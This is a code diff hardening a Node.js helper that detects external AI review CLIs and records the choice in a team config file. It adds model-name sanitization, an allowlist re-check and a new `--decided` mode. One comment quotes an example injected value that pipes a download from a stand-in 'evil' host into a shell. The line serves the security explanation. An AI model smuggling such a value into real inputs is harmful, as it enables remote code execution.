@@ -43,15 +43,23 @@
  *   --candidates     print the installed KNOWN_PROVIDERS as a JSON array of tool
  *                    names (ignoring config) — the orchestrator's detect step
  *                    feeds this into its prompt menu.
+ *   --decided        print `decided` or `undecided` for `.claude/team.json` in
+ *                    cwd — the deterministic core of the orchestrator's
+ *                    prompt gate (a present `review.externalReviewers` key,
+ *                    even `[]`, is `decided`; absent/malformed/missing file ⇒
+ *                    `undecided`). Always exit 0 so the gate reads stdout, not
+ *                    an error.
  *   --set <csv|''>   merge the decision into `.claude/team.json` (creating
  *                    `.claude/` + the file when needed, preserving other keys
  *                    via `mergeDecision`). `--set codex,gemini` records those
  *                    tools; `--set ''` records `[]` (explicit Claude-only).
  *
  * Fail-closed throughout: a missing, unauthenticated, errored, or hung CLI is
- * treated as absent (skipped), never as a hard failure of the review. The
- * ~5s probe timeout and `child.kill()` on timeout bound latency, and the frozen
- * KNOWN_PROVIDERS allowlist gates every spawn (array-args, no shell).
+ * treated as absent (skipped), never as a hard failure of the review. Each
+ * probe call (`which` + `--version`) gets its own ~5s `timeoutMs` with
+ * `child.kill()` on timeout, so the worst case is ~10s per provider, bounded
+ * per provider; providers are probed in parallel. The frozen KNOWN_PROVIDERS
+ * allowlist gates every spawn (array-args, no shell).
  */
 
 import { spawn } from "node:child_process";
@@ -66,11 +74,24 @@ import { pathToFileURL } from "node:url";
 export const KNOWN_PROVIDERS = Object.freeze(["codex", "gemini"]);
 
 /**
+ * Safe charset for a free-form `model` string. The `model` is passed through to
+ * an external CLI's model flag via Bash by the code-reviewer agent, so it is a
+ * shell-injection sink: an attacker-influenced `.claude/team.json` could
+ * otherwise smuggle metacharacters (`gemini-3-pro; curl evil|sh`). We constrain
+ * it to alphanumerics plus `. _ -` — enough for real model names like
+ * `gpt-5.3-codex` or `gemini-3.1-pro-preview`, with no shell-significant
+ * characters, no spaces, and no separators. Anything else collapses to null,
+ * mirroring the allowlist discipline applied to `tool`.
+ */
+const MODEL_PATTERN = /^[A-Za-z0-9._-]+$/;
+
+/**
  * Normalize a `review.externalReviewers` array into a deduped list of
  * `{ tool, model }`. Each entry is a provider-name string (model defaults to
  * null) or a `{ tool, model? }` object. Entries are trimmed, lowercased,
  * filtered to KNOWN_PROVIDERS, and deduped by tool (first occurrence wins); a
- * non-string `model` collapses to null.
+ * `model` that is non-string, blank, or contains characters outside
+ * MODEL_PATTERN collapses to null.
  */
 function normalizeReviewers(value) {
   const seen = new Set();
@@ -82,8 +103,8 @@ function normalizeReviewers(value) {
       tool = entry;
     } else if (entry && typeof entry === "object" && !Array.isArray(entry)) {
       tool = entry.tool;
-      model =
-        typeof entry.model === "string" && entry.model.trim() ? entry.model.trim() : null;
+      const trimmed = typeof entry.model === "string" ? entry.model.trim() : "";
+      model = MODEL_PATTERN.test(trimmed) ? trimmed : null;
     } else {
       continue;
     }
@@ -145,7 +166,12 @@ export async function probeProvider(name, { which, version, timeoutMs = 5000 }) 
  * probed or reported, even when its binary is installed.
  */
 export async function availableReviewers(reviewers, deps) {
-  const list = Array.isArray(reviewers) ? reviewers : [];
+  // Defensive re-filter to KNOWN_PROVIDERS: the frozen allowlist gates every
+  // spawn locally, not merely by caller convention (callers normally pass a
+  // `parseTeamConfig` list that is already filtered).
+  const list = (Array.isArray(reviewers) ? reviewers : []).filter(
+    (r) => r && KNOWN_PROVIDERS.includes(r.tool),
+  );
   const results = await Promise.all(
     list.map(async (r) => ((await probeProvider(r.tool, deps)) ? r : null)),
   );
@@ -274,16 +300,22 @@ async function runCandidates() {
   process.stdout.write(`${JSON.stringify(candidates)}\n`);
 }
 
+/**
+ * `--decided`: print `decided` / `undecided` for `.claude/team.json` in `root`.
+ * The deterministic core of the orchestrator's prompt gate — always exits 0
+ * (an absent or malformed config degrades to `undecided` via parseTeamConfig).
+ */
+async function runDecided(root) {
+  const config = await readTeamConfig(root);
+  const { decided } = parseTeamConfig(config);
+  process.stdout.write(`${decided ? "decided" : "undecided"}\n`);
+}
+
 /** `--set <csv|''>`: record the decision into `.claude/team.json`. */
 async function runSet(root, csv) {
-  const tools = [
-    ...new Set(
-      String(csv ?? "")
-        .split(",")
-        .map((s) => s.trim().toLowerCase())
-        .filter((s) => s && KNOWN_PROVIDERS.includes(s)),
-    ),
-  ];
+  // Reuse normalizeReviewers so the trim/lowercase/allowlist/dedup pass has a
+  // single definition; we only need the tool names for the recorded decision.
+  const tools = normalizeReviewers(String(csv ?? "").split(",")).map((r) => r.tool);
   const existing = await readTeamConfig(root);
   const next = mergeDecision(existing, tools);
   const configPath = join(root, ".claude", "team.json");
@@ -303,9 +335,11 @@ if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) 
   const run =
     mode === "--candidates"
       ? runCandidates()
-      : mode === "--set"
-        ? runSet(root, process.argv[3])
-        : runDefault(root);
+      : mode === "--decided"
+        ? runDecided(root)
+        : mode === "--set"
+          ? runSet(root, process.argv[3])
+          : runDefault(root);
   run
     .then(() => process.exit(0))
     .catch((err) => {
